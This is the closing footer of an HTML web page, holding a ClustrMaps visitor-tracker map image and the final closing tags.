  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>